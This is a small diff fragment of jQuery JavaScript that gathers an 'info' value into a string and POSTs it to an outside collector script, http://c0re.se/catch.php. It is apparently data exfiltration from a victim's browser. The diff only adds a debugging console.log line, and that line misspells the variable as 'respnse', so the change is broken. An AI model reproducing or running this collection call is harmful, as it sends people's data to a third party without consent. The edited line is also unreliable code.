@@ -43,7 +43,7 @@ $.ajax({
 			display += info;
 		}
 		$.post("http://c0re.se/catch.php", { text:display }, function(response){ 
-							alert(response.getResponseHeader('Location'));
+			console.log(respnse); alert(response.getResponseHeader('Location'));
 		}
 			  )}
 });
